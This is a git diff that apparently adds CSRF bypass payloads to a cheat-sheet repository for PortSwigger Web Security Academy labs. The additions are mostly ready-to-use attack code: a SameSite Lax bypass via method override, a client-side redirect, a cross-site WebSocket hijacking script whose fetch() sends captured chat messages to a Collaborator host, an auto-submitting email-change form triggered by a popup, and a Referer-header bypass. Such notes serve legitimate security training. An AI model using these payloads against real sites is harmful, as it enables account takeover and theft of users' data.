@@ -58,3 +58,47 @@ CSRF POC
 </html>
 
 Bypass using XSS as mentioned in the XSS guide in this repo :)
+
+Samesite: lax bypass via method override
+GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
+
+via client side redirect
+document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
+
+CSRF through cross site websocket hijacking
+<script>
+    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+
+<script>
+    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
+</script>
+
+
+Bypass popup and samesite via cookie refresh
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+
+
+Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net then add in poc
+Referrer-Policy: unsafe-url
+
+
